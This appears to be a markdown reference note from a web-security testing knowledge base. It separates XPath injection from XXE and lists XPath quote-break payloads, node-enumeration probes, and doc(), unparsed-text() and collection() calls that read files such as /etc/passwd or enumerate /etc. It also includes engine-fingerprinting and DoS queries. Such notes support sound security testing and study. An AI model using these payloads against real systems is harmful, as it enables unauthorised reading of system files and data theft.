# XPath / XQuery — the adjacent XML-injection class

## The boundary — XPath is NOT XXE

XXE = entity resolution. XPath injection = injecting INTO an XPath
expression's string literal. Same input format (XML docs), different
mechanism — different class. Route to `web-sqli`-adjacent thinking.

## The XPath-injection shapes — recognize them

```
/app/user[name='INPUT' and pass='INPUT']
doc('users.xml')/users/user[name='$u']
/user[username='$u' and password='$p']
//user[name/text()='$u' and pass/text()='$p']
```

`' or '1'='1` / `') or ('1'='1` — the classic quote-break — a SQLi-like
oracle inside XPath — different class, different skill.

## The XPath probes — if you land here, it's a different bug

```
' or 1=1 or 'a'='a
' or count(/*)=1 or 'a'='a
' or true() or 'x'='x
'|//
') or ('x'='x
')] | //* | //*[('
' or position()=1 or '
x' or name()='password' or '
```

`') or ('1'='1` — balances a paren when the query is wrapped in
`(...'...'...)`.

## The `doc()`/`unparsed-text()` — XPath's own file-read

```xpath
doc('file:///etc/passwd')
doc('http://internal/x')
unparsed-text('file:///flag')
document('file:///x.xml')
```

XPath 2.0 `doc()`/`unparsed-text()` fetch URIs — an XPath-injection-
level file-read that doesn't need entities — the adjacent primitive.

## `function-available()`/`system-property()` — the recon

```xpath
system-property('xsl:version')
system-property('xsl:vendor')
function-available('dyn:evaluate')
```

Fingerprint the XPath/XSLT engine — which extensions exist.

## The XPath-2.0-vs-1.0 split — the version determines the surface

XPath 1.0 — no `doc()`, no `unparsed-text()` — read is dead, oracle only.
XPath 2.0 — `doc()`/`unparsed-text()`/`collection()` — reads live.

## `collection()` — the directory read

```xpath
collection('file:///etc/')
collection('/etc/')?select=*
```

XPath 2.0 — lists/iterates a directory — a read-AND-enumerate primitive.

## The XPath-dos — `count(//*)` / deep-path DoS

```xpath
count(//*)       — the whole doc count — DoS on huge docs
//*[position()=1]
```

A `count(//*)`-style query forces full-tree traversal — timing oracle /
DoS.

## The "XPath inside XSLT inside XXE" — the full stack

`xml-stylesheet` → XSLT → `<xsl:value-of select="doc('file:///flag')"/>` —
the XSLT's `doc()`/`document()` does the read — `xxe-to-rce.md`.

## The XPath-oracle for XXE — using XPath to detect entity expansion

```xpath
count(//r[text()='XXE_PROBE'])       — did &probe; expand?
```

If the app's XPath output distinguishes — the "did the entity expand"
oracle — a detection probe.

## Routing note — the class boundary

| If the input controls... | Class |
|---|---|
| the XML doc itself → entity resolution | XXE |
| an XPath string literal → XPath injection | separate class |
| an XSLT stylesheet → XSLT injection | exec-adjacent |
| a schema → schema-validation side-effects | narrow |

## Falsifiers

- `doc()`/`unparsed-text()`/`collection()` undefined (XPath 1.0 engine)
  → read dead, oracle-only — still a bug, different class
